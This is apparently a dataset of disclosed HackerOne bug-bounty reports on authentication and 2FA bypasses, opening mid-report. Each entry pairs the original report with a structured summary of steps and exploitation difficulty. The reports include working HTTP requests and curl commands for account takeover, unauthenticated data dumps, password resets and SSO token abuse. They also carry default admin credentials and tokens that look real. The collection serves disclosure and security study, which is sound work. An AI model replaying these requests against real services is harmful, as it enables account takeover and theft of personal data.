Observe that the authentication is successful despite using an expired code.
Suggest Fix
Reduce the window of acceptance to a more secure value (e.g., 30 seconds).
Implement a more robust TOTP algorithm that rejects expired codes.
Optional: Supporting Material/References (Screenshots)
I have attached a POC video via google drive link cause it is over 250 mb.
https://drive.google.com/file/d/1onGsQvF-mmPXisjmxhkBbQUB4sbvoXz5/view?usp=sharing
Impact
The attacker can bypass the two factor authentication by using expired otp code.



================================================================================
Vulnerability Description:
The TOTP authenticator implementation accepts expired codes, allowing attackers to bypass authentication by reusing old codes. This reduces the security benefits of TOTP, potentially leading to unauthorized access.

Steps to Reproduce:
1. Enable TOTP authentication for the account at hackerone.com with Google Authenticator.
2. Log in to the TFA-enabled account with the correct password.
3. When prompted for TFA, save the current TOTP code from the authenticator app.
4. Wait for the code to expire (e.g., 1 minute).
5. Submit the expired code to the authentication endpoint.
6. Observe that the authentication is successful despite using an expired code.
Exploitation Difficulty:
The vulnerability involves a straightforward test of TOTP code expiration logic. The steps are simple and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2858876: Unauthorized Access  Exposing Sensitive Data
================================================================================
RAW DESCRIPTION:

The identified page allows unauthorized access to a user's profile management functionality without requiring authentication. Upon accessing the page, sensitive user details such as name, email address, and EDIPI, 10 digits are exposed. Additionally, an update function is available, suggesting potential for unauthorized data manipulation.
Impact
Sensitive Data Exposure: Unauthorized parties can view critical personal identifiers
Data Manipulation: If the update function is exploitable and Privacy and Security Risks
System Host(s)
████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
1- go to the website https://████/
2 - will be asking to select certificate Just just click cancel Otherwise the server will response 403 - Forbidden: Access is denied
3- Agree to the agreement and click on ██████████ will redirect to https://█████/███████/
4- click on login
5- will redirect you to https://████/███████/Dashboard
Suggested Mitigation/Remediation Actions
Implement Authentication: Enforce strict authentication requirements



================================================================================
Vulnerability Description:
The vulnerability allows unauthorized access to a user's profile management functionality without requiring authentication, exposing sensitive details such as name, email address, and EDIPI. Additionally, an update function is available, suggesting potential for unauthorized data manipulation.

Steps to Reproduce:
1. Navigate to the website https://████/
2. Cancel the certificate prompt when asked to select a certificate (otherwise, the server will respond with a 403 - Forbidden error)
3. Agree to the agreement and click on ██████████, which will redirect to https://█████/███████/
4. Click on the login button
5. You will be redirected to https://████/███████/Dashboard, where sensitive user details (name, email, EDIPI) are exposed without authentication
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic navigation and interaction with the website without any complex steps or subtle interactions between components. The exposure of sensitive data is immediate upon accessing the page without authentication.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2885636: 2FA Bypass leads to  impersonation of legimate users
================================================================================
RAW DESCRIPTION:

Summary:
Hello team,
I have discovered a logic flaw in the authentication system that allows an attacker (User A) to impersonate a legitimate user (User B) who has not yet registered. By abusing the email change functionality and bypassing 2FA, the attacker can retain access to the account until the legitimate user resets their password.
Steps to re-produce
Go to https://www.drugs.com/account/register/ and create an account using an email you own.
██████
Complete OTP verification and select "Trust this device for 1 month". This gives you a valid session that does not require 2FA for one month.
Go to https://www.drugs.com/account/details/ and change the email to the victim's email (User B)
Now, the attacker has a valid session associated with User B's email for one month, bypassing 2FA.
Now, the attacker has a valid session associated with User B's email for one month, bypassing 2FA.
███
Log out and log back in to confirm that the application doesn't prompt for OTP.
To maintain this bypass indefinitely (until the original user resets the password):
Change the email back to the attacker's email.
Re-verify the new email by completing OTP verification and selecting "Trust this device for 1 month".
Change the email back to the victim's email (or any other arbitrary email).
By repeating this process, the attacker can retain access without triggering 2FA.
Note that the platform only notifying the attacker to activate the account , but not Terminating the session after the email has changed successfully
From victim POV
Go to Sign Up page
try to Sign up with the victim's email
Note that the platform says that email's already used (while the original Owner of the email didn't create the account)
███████
Impact
Summary:
Loss of Trust: Users will lose confidence in the platform's security if they learn attackers had impersonated them.
Impersonation Risk: Attackers can impersonate legitimate users and interact with the platform.
Email Ownership Not Protected: The platform fails to verify the original owner of the email, allowing attackers to use it.



================================================================================
Vulnerability Description:
A logic flaw in the authentication system allows an attacker to impersonate a legitimate user who has not yet registered by abusing the email change functionality and bypassing 2FA. The attacker can retain access to the account until the legitimate user resets their password.

Steps to Reproduce:
1. Go to https://www.drugs.com/account/register/ and create an account using an email you own.
2. Complete OTP verification and select 'Trust this device for 1 month' to get a valid session.
3. Go to https://www.drugs.com/account/details/ and change the email to the victim's email (User B).
4. Log out and log back in to confirm that the application doesn't prompt for OTP.
5. To maintain this bypass indefinitely, change the email back to the attacker's email, re-verify with OTP, and then change it back to the victim's email.
Exploitation Difficulty:
The vulnerability involves multiple components (account creation, 2FA bypass, email change) and requires understanding subtle interactions between these components, such as session persistence after email changes and the lack of proper email ownership verification.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/397130: Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass
================================================================================
RAW DESCRIPTION:

Summary
athena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information.
Description
When you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do view-source:athena-flex-production.shopifycloud.com in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website:
https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js
When you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to.
For my test I sent:
Code 422 Bytes
1{"query": "query getRecentTicketsQuery($domain: String) {\n    shop(myshopifyDomain: $domain) {\n      zendesk {\n        tickets(last: 5) {\n          edges {\n            node {\n              id\n               requester {\n                name\n              }\n              subject\n              description\n              }\n          }\n        }\n      }\n    }\n  }\n","variables":{"domain":"ok.myshopify.com"}}
What this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data.
I don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report.
Reproduction
Send the following curl request:
Code 994 Bytes
1curl -i -s -k  -X $'POST' \
2    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \
3    --data-binary $'{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}' \
4    $'https://athena-flex-production.shopifycloud.com/graphql'
More information
There is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure:
Code 130 Bytes
1R = n.n(O)()({
2 apiKey: "5c0246635b3c77189888c0b10d3427ac",
3 notifyReleaseStages: ["production"],
4 releaseStage: "production" 
5}),
Impact
Get ticket description means dumping any detail you want.
Creating zendesk ticket in behalf of other agents.
Changing state of other tickets.
I will post list of all functions that is possible in this graphql.



================================================================================
Vulnerability Description:
This vulnerability allows unauthenticated access to sensitive Zendesk ticket information through a GraphQL endpoint exposed in a JavaScript file that loads before an Okta redirect on Shopify's internal system (athena-flex-production.shopifycloud.com).

Steps to Reproduce:
1. Observe that athena-flex-production.shopifycloud.com loads momentarily before redirecting to Okta
2. Using view-source in Chrome, examine the initial page content: view-source:athena-flex-production.shopifycloud.com
3. Locate the JavaScript source file in the page source: https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js
4. Beautify and analyze the JS to identify the GraphQL endpoint structure
5. Send a targeted GraphQL query directly to the endpoint to access Zendesk ticket information
Exploitation Difficulty:
The vulnerability involves multiple components (JS file analysis, GraphQL endpoint discovery, and Zendesk data access) and requires understanding the interaction between the initial page load and the Okta redirect. However, once the JS file is discovered, the attack is straightforward.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/421859: H1514 [*.(my)shopify.com] - Viewing Password Protected Content
================================================================================
RAW DESCRIPTION:

Hi guys!
When administering a shop, the owner has the ability to preview his shop with various themes. When previewing, a unique link is generated, which the owner can share with various people without any authentication.
The generation of that unique link does not require authentication, which means any user can generate a preview link and view the contents of the shop.
Previewing isn't affected by password protection, so a user who has managed to obtain a preview link can successfully view the shop's content without knowing the password.
Steps to Reproduce
Visit the following shop : https://mycorb3nikshop.myshopify.com.
Notice that it is protected by a password.
Visit https://mycorb3nikshop.myshopify.com/preview_bar and view the page's source code.
Search for a shopifypreview.com URL. This is the preview link generated for mycorb3nikshop.
Visit the preview URL.
You should now see the contents of the shop. Note that we've successfully viewed the content without any authentication.
<image_0>
Impact
The impact of this bug is pretty straightforward. Because of the /preview_bar, the password protection is rendered useless.
Depending on the confidentiality of a shop's content, I would set the severity to either high or medium here :)



================================================================================
Vulnerability Description:
The vulnerability allows any user to bypass password protection on a Shopify store by generating a preview link through the /preview_bar endpoint, which does not require authentication. This preview link grants access to the store's content without needing the password.

Steps to Reproduce:
1. Visit the password-protected shop: https://mycorb3nikshop.myshopify.com
2. Access the preview link via https://mycorb3nikshop.myshopify.com/preview_bar and view the page's source code to find the shopifypreview.com URL
3. Visit the preview URL to bypass password protection and view the shop's content
Exploitation Difficulty:
The attack involves a straightforward process of accessing a known endpoint (/preview_bar) and extracting the preview link from the source code. There are no complex interactions or state manipulations required, and the logic is not novel but rather a simple oversight in access control.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/496219: █████ - Pre-generation of VIEWSTATE allows CAC bypass
================================================================================
RAW DESCRIPTION:

Summary:
As of today, ███ is back online (https://███████).
█████████ allows users to check a box labeled Require CAC for Pick-up. This option requires users to present their CAC in order to download files. As explained by ███:
Choosing this option, however, does add a significant degree of assurance that the recipient is in fact who they claim to be by verifying their identity via the CAC.
However, this security control can be bypassed, allowing downloading files without CAC authentication.
(Note that a CAC bypass was reported in #429000. Since then, ████████ has deployed a patch for that report, although a different bypass is possible.)
Description:
The pickupfiles.aspx page is where recipients of both non-CAC and CAC-enforced files visit to retrieve files. If the file is CAC enforced, the user is redirected to CACPickup.aspx. If not, the user must present their password in order to download the file.
For requests that are not CAC enforced, the server generates a MAC enabled VIEWSTATE parameter containing the package ID. This package ID in the viewstate is then checked against the package ID in the request to ensure that the user is downloading the correct file. As the viewstate is MAC enabled, it is not possible to modify the parameter without the server throwing an error.
The challenge lies in obtaining a valid viewstate for a CAC-enabled file. The server does not return a viewstate for CAC files, instead immediately redirecting to the CAC pickup page. However, this can be bypassed by pre-generating a viewstate for possible future request IDS (these are incremental). Then, when an attacker wishes to bypass CAC authentication, they can simply lookup the pre-generated viewstate and make a valid request to download the file.
Impact
This allows bypass of CAC authentication for picking up files, a significant security control on ███████.
Step-by-step Reproduction Instructions
Send a test file on https://█████████ to see the most recent package ID.
Using a tool such as Burp Intruder, enumerate package IDs in the request to https://████████/safe/pickupfiles.aspx?id=package_id, beginning at the most recent package ID. A large number of viewstates can be computed in advance. For testing, I computed a couple hundred.
As a normal user, send a file transfer to yourself, enforcing the CAC required option.
Visiting the pickupfiles.aspx link in the file transfer email, observe that CAC authentication is enforced.
Look up the package ID in your table of pre-generated requests. Make a request with the associated viewstate and validation parameter (e.g. in Burp Suite, right click -> show response in browser) and enter the sent password.
Observe that the validation of the viewstate parameter passes, and you may now download the file.
Suggested Mitigation/Remediation Actions
Prevent users from downloading files from pickupfiles.aspx when the file is CAC-enabled.
Impact
.



================================================================================
Vulnerability Description:
The vulnerability allows bypassing CAC authentication by pre-generating VIEWSTATEs for incremental package IDs, enabling unauthorized file downloads without presenting a CAC.

Steps to Reproduce:
1. Send a test file to observe the most recent package ID.
2. Enumerate package IDs using a tool like Burp Intruder to pre-generate VIEWSTATEs.
3. Send a file transfer to yourself with CAC required.
4. Visit the pickupfiles.aspx link and observe CAC enforcement.
5. Use a pre-generated VIEWSTATE to make a request with the package ID and password.
6. Download the file without CAC authentication.
Exploitation Difficulty:
The attack involves understanding the VIEWSTATE generation mechanism, pre-generating valid VIEWSTATEs for future IDs, and leveraging these to bypass CAC checks. While the components are straightforward, the need to pre-generate and store VIEWSTATEs adds complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/566811: ████ - Complete account takeover
================================================================================
RAW DESCRIPTION:

Summary:
███████ ██████████ was updated today (03/04), which includes a backend rewrite. Unfortunately, the new site is insecure and allows a password to be reset given only a username. This allows access to payment records for any DoD employee given only their username, which is commonly known. Further, ███ is used to authenticate to other sites such as ██████. Thus, this allows access to the complete ████████ record and other associated information (despite ████████ stating that ██████████ login is disabled, it still works).
Impact
Trivial and complete compromise of any/all ████████ ███████ accounts, resulting in exposure and modification of sensitive financial records for all DoD civilian/military personnel. For instance, this exposes partial social security numbers, personal addresses, and pay history, and allows stealing funds by changing direct deposit information. Further, via associated sites (█████), this exposes the ██████ of all military service members.
Step-by-step Reproduction Instructions
Visit https://████████/ and intercept a request to obtain valid cookies.
Make the following request, replacing the cookies with your new cookies if needed:
Code 646 Bytes
1POST /api/session/personalsettings/ForgotPasswordChangeRequest HTTP/1.1
2Host: ███
3Connection: close
4Content-Length: 151
5Accept: application/json, text/plain, */*
6Origin: https://█████████
7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
8Content-Type: application/json
9Referer: https://████████/
10Accept-Encoding: gzip, deflate
11Accept-Language: en-US,en;q=0.9
12Cookie: LastMRH_Session=█████; F5_ST=██████; MRHSession=████████████████████
13
14{"Username":"x","Password":"y","IsLimitedAccessAccount":false,"HasNagC":false,"HasNagF":false,"HasNagM":false,"HasNagN":false}
Enter any user's username and a new password.
Submit the request. The user's password will be overwritten to the new password, and you may now log in.
Visit https://██████/milconnect/. Select to log in via █████. Despite the message saying it is disabled, edit the form via developer tools to enable both text boxes and the login button. Enter the user's credentials.
The login will be successful, allowing full access to the user's ███.
Suggested Mitigation/Remediation Actions
Enforce social security number / security questions / email verification.
Impact
.



================================================================================
Vulnerability Description:
The vulnerability allows complete account takeover by resetting any user's password with only their username, bypassing standard security checks. This exposes sensitive financial and personal data, including partial SSNs, addresses, and pay history, and enables fund theft via direct deposit changes. Additionally, it grants access to other associated systems despite claimed disabled login functionality.

Steps to Reproduce:
1. Visit the target website and intercept a request to obtain valid session cookies.
2. Send a POST request to the password reset endpoint with the intercepted cookies, specifying only the target username and a new password.
3. Log in to the target account using the new password.
4. Access the associated site (e.g., milconnect) by enabling disabled login fields via developer tools and logging in with the compromised credentials.
Exploitation Difficulty:
The attack involves multiple components (password reset, cookie interception, UI manipulation) and requires understanding of how the systems interconnect, but the core flaw (password reset with only username) is straightforward once identified. The manipulation of disabled login fields adds some complexity but is a known technique.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/671406: Account takeover via Google OneTap
================================================================================
RAW DESCRIPTION:

Summary:
It's possible to take over any priceline.com user's account knowing their email. The only requirement is that the victim's email domain is not registered with Google's Gsuite. The root cause of this issue is that the backend does not verify whether the email provided is a confirmed one.
Steps To Reproduce:
Create Account A (in my case badca7@wearehackerone.com) with priceline.com, without any SSO, via the "Create an account" link (aka "register with email").
Once the account has been created, add a dummy phone number to the profile. It will serve as a canary to demonstrate we accessed the same data in the next steps.
In another browser/session (eg, incognito/private mode) sign up for a trial GSuite account at https://gsuite.google.com/signup/basic/welcome . This will be Account B.
Use any email to register as you won't need to confirm that email.
When the wizard comes to the "Does your business have a domain?" confirm and enter wearehackerone.com (or any other domain that hosts the victim's email box) as in gsuite.png (F552718). You may not use the same domain name at this stage, as I claimed it for the purposes of this PoC however you can do so when my GSuite trial expires. From this comes the requirement that the victim's email domain name must not be registered with Google prior to this attack.
Once you saved the domain record with Google, stop there as there's no need to verify the domain.
At this stage the OneTap/GoogleYOLO popup will be showing on priceline.com when visited in the same browser session. It took me some time to get it to show however signing in and out of Google Account several times with the newly created GSuite credentials and then refreshing the priceline.com page helped. On another occasion a Gmail account, which I signed in in the same browser window helped too. You may need to play around with these until you see the newly created account to show in the list. popup_onetap.png (F552723)
Once you have that, just sign in (badca7@wearehackerone.com in my case). You can confirm you accessed Account A by seeing the phone number you added in step (2). In the other browser window/session with Account A you can see that now there are two accounts showing in the top right corner and the profile data is blank.
Account takeover complete. AccountA_after_takeover.png (F552724)
Notes
IP used for this PoC: ███
Impact
Attackers can take over any priceline.com account given they were able to register a specific domain with GSuite.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over any priceline.com user's account by exploiting Google OneTap when the victim's email domain is not registered with GSuite. The backend does not verify if the email provided is confirmed, enabling account takeover.

Steps to Reproduce:
1. Create an account on priceline.com with an email from a domain not registered with GSuite.
2. Register the victim's email domain with a trial GSuite account without verifying the domain.
3. Trigger the Google OneTap popup on priceline.com by signing in and out of the GSuite account.
4. Use the OneTap popup to sign in to the victim's account on priceline.com.
Exploitation Difficulty:
The attack involves multiple components (priceline.com account creation, GSuite registration, Google OneTap interaction) and requires manipulating complex application states (triggering the OneTap popup). The interaction between these components is subtle and non-obvious, especially the requirement for the victim's domain to be unregistered with GSuite.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/684070: Authentication bypass and RCE on the https://████ due to exposed Cisco TelePresence SX80 with default credentials
================================================================================
RAW DESCRIPTION:

Description
Hello. I was able to identify Cisco TelePresence SX80 device located on the https://█████
According to the IP Info: https://ipinfo.io/████████it belongs to ASN with ID
Code 7 Bytes
1███████
so it's likely in scope of the program.
The mentioned instance has default credentials ████
POC
https://███████
Login with █████████
████
Since we are logged in as ███, we can completely control the device and all connections, and add our startup scripts via https://██████████/web/scripts
Suggested fix
Change the credentials and likely you will need to reset the device
Impact
Potential device compromise and code execution. This devices are used mainly for trainings, briefings, and demonstration rooms, as well as auditoriums, so attacker with full control of the device potentially can intercept the data (RCE potential is interesting, but ability to silently compromise the device and use it as backdoor can be much more harmful).



================================================================================
Vulnerability Description:
The vulnerability involves an authentication bypass and remote code execution (RCE) on a Cisco TelePresence SX80 device due to exposed default credentials. This allows an attacker to gain full control of the device, potentially intercepting data and using it as a backdoor.

Steps to Reproduce:
1. Identify the Cisco TelePresence SX80 device on the target URL https://█████
2. Login to the device using the default credentials ████
Exploitation Difficulty:
The attack is straightforward, involving only the identification of the device and the use of default credentials. There are no complex interactions or state manipulations required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/684758: Authentication bypass and potential RCE on the https://████ due to exposed Cisco TelePresence SX80 with default credentials
================================================================================
RAW DESCRIPTION:

Description
Hello. I was able to identify another one Cisco TelePresence SX80 device located on the https://████████ right near the previous device ████ (after #684070 report I decided to check ████* range)
According to the IP Info: https://ipinfo.io/AS257/████0/24 it belongs to ASN with ID
Code 9 Bytes
1AS257 ███
The mentioned instance has same credentials admin:admin.
This instance is different and less used, the logs reveals that last time device was used in 2017 year.
POC
https://████████
Login with admin:admin
███████
Since we are logged in as admin, we can completely control the device and all connections, and add our startup scripts via https://███████/web/scripts thus achiecing code execution.
Suggested fix
Change the credentials and likely you will need to reset the device to factory settings
Impact
Potential device compromise and code execution. This devices are used mainly for trainings, briefings, and demonstration rooms, as well as auditoriums, so attacker with full control of the device potentially can intercept the data (RCE potential is interesting, but ability to silently compromise the device and use it as backdoor can be much more harmful).



================================================================================
Vulnerability Description:
The vulnerability involves an authentication bypass and potential remote code execution (RCE) on a Cisco TelePresence SX80 device due to exposed default credentials (admin:admin). An attacker can gain full control of the device, manipulate connections, and execute arbitrary code by uploading malicious scripts.

Steps to Reproduce:
1. Identify a Cisco TelePresence SX80 device on the network, specifically checking IP ranges similar to previously reported vulnerable devices.
2. Access the device's web interface using the default credentials admin:admin.
3. Navigate to the scripts section at https://███████/web/scripts and upload a malicious startup script to achieve remote code execution.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it relies on default credentials, a common and well-known security misconfiguration. The attack does not involve complex interactions or novel logic, making it easy to identify and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/734936: SSO bypass in zendesk using trint organization able to leak internal ticket information
================================================================================
RAW DESCRIPTION:

Summary
hello there because in app.trint.com there's no email verification i able to login in your zendesk SSO using your organization
your organization using domain *@trint.com because there's no email verification i able to read and takeover + claim this email
support+1@trint.com and i able to login in zendesk SSO using that email.
How to reproduce
i registered in app.trint.com using this email support+1@trint.com until registration step finish
i check my burp history there's a graphql request in this host https://graphql2.trint.com/
i use this query
Code 1.09 KiB
1POST / HTTP/1.1
2Host: graphql2.trint.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
4Accept: */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://app.trint.com/
8content-type: application/json
9Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU
10X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
11X-Trint-Super-Properties: {}
12Origin: https://app.trint.com
13Content-Length: 111
14Connection: close
15
16{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
HTTP/1.1 200 OK

{"data":{"zendeskToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM"}}
Code 527 Bytes
1
2* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM`
3
4* boom logged in in ticket using email `support+1@trint.com`
5
6#POC
7
8{F631462}
9
10## Impact
11
12#Impact
13* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to bypass SSO in Zendesk by registering with a @trint.com email (without verification) and extracting a JWT token from GraphQL requests. The attacker can then use this token to log in to Zendesk and access internal ticket information.

Steps to Reproduce:
1. Register on app.trint.com using an email with the @trint.com domain (e.g., support+1@trint.com) without email verification.
2. Intercept the GraphQL request to https://graphql2.trint.com/ using a tool like Burp Suite to extract the JWT token for Zendesk SSO.
3. Craft a URL to access Zendesk SSO with the extracted JWT token: https://trintsupport.zendesk.com/access/jwt?jwt=<token>.
4. Access internal ticket information via https://support.trint.com/hc/en-us/requests/organization.
Exploitation Difficulty:
The attack involves multiple components (registration, GraphQL interception, JWT token extraction, and SSO bypass) and requires understanding the interaction between these components. However, the steps are straightforward once the initial registration flaw is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/766578: Absence of Token expiry leads to Unauthorized login Access
================================================================================
RAW DESCRIPTION:

Summary
While doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.
The way affirm mobile login works is that,
User inputs the phone number
It then makes a call to an API endpoint /api/v3/login/phone/
Code 282 Bytes
1POST /api/v3/login/phone/ HTTP/1.1
2Content-Type: application/json; charset=UTF-8
3Content-Length: 40
4Host: hackerone.affirm-odin.com
5Connection: close
6Accept-Encoding: gzip, deflate
7User-Agent: okhttp/3.13.1
8Affirm-User-Agent: Affirm-Android
9
10{"channel":"sms","address":"7022170000"}
This endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.
The response looks something similar to this
Code 411 Bytes
1HTTP/1.1 200 OK
2Date: Tue, 31 Dec 2019 11:53:27 GMT
3Content-Type: application/json
4Connection: close
5Server: openresty
6Vary: Accept-Encoding
7Affirm-Device: XXX=
8Affirm-Client: XXXX-
9cache-control: private, no-cache, no-store, must-revalidate
10X-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c
11Strict-Transport-Security: max-age=86400
12Content-Length: 299
13
14{"response_url": "/api/v3/login/phone/SOMETOKEN"}
Another call to the api is made to the URL obtained from the above response_url This API request looks like this
Code 322 Bytes
1POST /api/v3/login/phone/SOMETOKEN HTTP/1.1
2Content-Type: application/json; charset=UTF-8
3Content-Length: 19
4Host: hackerone.affirm-odin.com
5Connection: close
6Accept-Encoding: gzip, deflate
7Affirm-User-Agent: Affirm-Android
8Affirm-App-Version: 3.62.3
9Affirm-App-Version-Code: 312
10Affirm-OS-Version: 22
11
12{"response":"0000"}
<image_0>
The response will be
Code 661 Bytes
1HTTP/1.1 200 OK
2Date: Tue, 31 Dec 2019 12:30:58 GMT
3Content-Type: application/json
4Connection: close
5Server: openresty
6Vary: Accept-Encoding
7Affirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=
8Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
9cache-control: private, no-cache, no-store, must-revalidate
10X-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca
11Strict-Transport-Security: max-age=86400
12Content-Length: 109
13
14{"status": "authenticated", "token": null, "user_id": "1479-5770-XGGL", "expiration": "3019-12-31T17:17:38Z"}
This response contains Affirm-Client which is like a session ID, later used to make a request.
To verify if this is the actual session ID or not, this can be done by making a request to the api
Code 428 Bytes
1GET /api/v2/users/1479-5770-XGGL HTTP/1.1
2Host: hackerone.affirm-odin.com
3Connection: close
4Accept-Encoding: gzip, deflate
5User-Agent: okhttp/3.13.1
6Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
7Affirm-Platform: android
8Affirm-User-Agent: Affirm-Android
9Affirm-App-Version: 3.62.3
10Affirm-App-Version-Code: 312
11Affirm-OS-Version: 22
The user ID can also be obtained from the above response.
If the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.
Code 834 Bytes
1{"phone_number": {"phone_number": "+1-702-217-0000", "user_id": "1479-5770-XGGL", "id": "CNAIG0U1BMPHN5BK"}, "status": "ACTIVE", "name": {"last": "NEPAK", "full": "TESTING NEPAK", "user_id": "1479-5770-XGGL", "id": "4ZBC33TYEY12SOWP", "first": "TESTING"}, "is_personalized_services_active": true, "created": "2019-12-31T10:48:00Z", "dob": "1980-06-23", "id": "1479-5770-XGGL", "address_confirmation_status": "not confirmed", "address": {"city": "San Francisco", "user_id": "1479-5770-XGGL", "is_po_box": false, "street1": "325 Pacific Ave", "region1_code": "CA", "is_military_address": false, "postal_code": "94111", "country_code": "USA", "id": "G2YM6ESBLH36ETLZ"}, "user_consented_to_lto": null, "email": {"verified": false, "user_id": "1479-5770-XGGL", "email": "who_has_no_name+0000@wearehackerone.com", "id": "B9SUH5XOB1559Q8J"}}
<image_1>
Remediation
Rate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.
The fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.
Luckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.
